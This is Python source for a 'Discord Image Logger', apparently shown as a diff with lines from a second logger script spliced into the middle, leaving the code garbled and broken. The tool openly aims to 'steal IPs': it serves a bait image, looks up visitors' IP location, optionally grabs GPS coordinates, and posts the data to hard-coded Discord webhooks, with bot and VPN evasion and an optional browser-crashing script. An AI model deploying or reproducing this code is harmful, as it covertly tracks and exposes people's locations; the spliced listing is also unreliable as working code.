
@@ -1,304 +1,69 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1361668974206779552/amPEf46kyp9dSU9cTzdSWw3q6l8wlyEncwKhWc0UYrm6nejcmVOvlnQb_V1IamzjpMMF",
     "image": "https://www.google.com/imgres?q=dog&imgurl=https%3A%2F%2Fimages.theconversation.com%2Ffiles%2F625049%2Foriginal%2Ffile-20241010-15-95v3ha.jpg%3Fixlib%3Drb-4.1.0%26rect%3D12%252C96%252C2671%252C1335%26q%3D45%26auto%3Dformat%26w%3D1356%26h%3D668%26fit%3Dcrop&imgrefurl=https%3A%2F%2Ftheconversation.com%2Fthe-science-of-happier-dogs-5-tips-to-help-your-canine-friends-live-their-best-life-236952&docid=nVJvwXsRkyobqM&tbnid=kJZiNrh1U9EYBM&vet=12ahUKEwiGjfacgtqMAxWsVKQEHdh4E4wQM3oECBsQAA..i&w=1356&h=668&hcb=2&ved=2ahUKEwiGjfacgtqMAxWsVKQEHdh4E4wQM3oECBsQAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
                 # 3 = Don't send an alert when it's possibly a bot
                 # 4 = Don't send an alert when it's 100% a bot
     
 
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
         "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
     # Do not edit anything below this, unless you know what you're doing.
     # NOTE: Hierarchy tree goes as follows:
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
     # 4) Image 
 }
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
         return False
 
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "@everyone",
     "embeds": [
 import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
   "username": "Fentanyl",
   "content": "@everyone",
   "embeds": [
     {
       "title": "Fentanyl strikes again!",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
         "name": "Fentanyl"
       },
       "fields": [
         {
             "title": "Image Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n
\n{error}\n
",
         }
     ],
 })
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
     
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "",
     "embeds": [
           "name": "IP Info",
           "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}",
           "inline": True
         },
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
           "name": "Advanced Info",
           "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** Look Below!\n
yaml\n{useragent}\n
",
           "inline": False
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
     ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
         if config["vpnCheck"] == 2:
                 return
         
         if config["vpnCheck"] == 1:
             ping = ""
     
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
                 pass
             else:
                 return
 
         if config["antiBot"] == 3:
                 return
 
         if config["antiBot"] == 2:
             if info["proxy"]:
                 pass
             else:
                 ping = ""
 
         if config["antiBot"] == 1:
                 ping = ""
 
 
     os, browser = httpagentparser.simple_detect(useragent)
     
     embed = {
     "username": config["username"],
     "content": ping,
     "embeds": [
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** {endpoint}
             
 **IP Info:**
 > **IP:** {ip if ip else 'Unknown'}
 > **Provider:** {info['isp'] if info['isp'] else 'Unknown'}
 > **ASN:** {info['as'] if info['as'] else 'Unknown'}
 > **Country:** {info['country'] if info['country'] else 'Unknown'}
 > **Region:** {info['regionName'] if info['regionName'] else 'Unknown'}
 > **City:** {info['city'] if info['city'] else 'Unknown'}
 > **Coords:** {str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** {info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})
 > **Mobile:** {info['mobile']}
 > **VPN:** {info['proxy']}
 > **Bot:** {info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}
 
 **PC Info:**
 > **OS:** {os}
 > **Browser:** {browser}
 
 **User Agent:**
 
{useragent}
""",
       ]
     }
   ],
 }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
     # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
             if config["imageArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
                     url = config["image"]
             else:
                 url = config["image"]
 
             data = f'''<style>body {{
 margin: 0;
 padding: 0;
 }}
 div.img {{
 background-image: url('{url}');
 background-position: center center;
 background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
                 return
             
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                 
 
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
                     message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                     message = message.replace("{isp}", result["isp"])
                     message = message.replace("{asn}", result["as"])
                     message = message.replace("{country}", result["country"])
                     message = message.replace("{region}", result["regionName"])
                     message = message.replace("{city}", result["city"])
                     message = message.replace("{lat}", str(result["lat"]))
                     message = message.replace("{long}", str(result["lon"]))
                     message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                     message = message.replace("{mobile}", str(result["mobile"]))
                     message = message.replace("{vpn}", str(result["proxy"]))
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
 
                 datatype = 'text/html'
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
                 
                 if config["crashBrowser"]:
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                 self.send_response(200) # 200 = OK (HTTP Status)
                 self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
                     data += b"""<script>
 var currenturl = window.location.href;
 
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (coords) {
     if (currenturl.includes("?")) {
         currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
     } else {
         currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
 def prev(ip,uag):
   return {
   "username": "Fentanyl",
   "content": "",
   "embeds": [
     {
       "title": "Fentanyl Alert!",
       "color": 16711803,
       "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** {ip}\n**UserAgent:** Look Below!\n
yaml\n{uag}
",
       "author": {
         "name": "Fentanyl"
       },
       "fields": [
       ]
     }
     location.replace(currenturl);});
 }}
 
 </script>"""
                 self.wfile.write(data)
         
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
             self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
   ],
 }
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         s = self.path
         dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
         try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
         except Exception: data = bindata
         useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
         os, browser = httpagentparser.simple_detect(useragent)
         if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
             if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
             else: pass
         else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
         return
     
     do_GET = handleRequest
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI


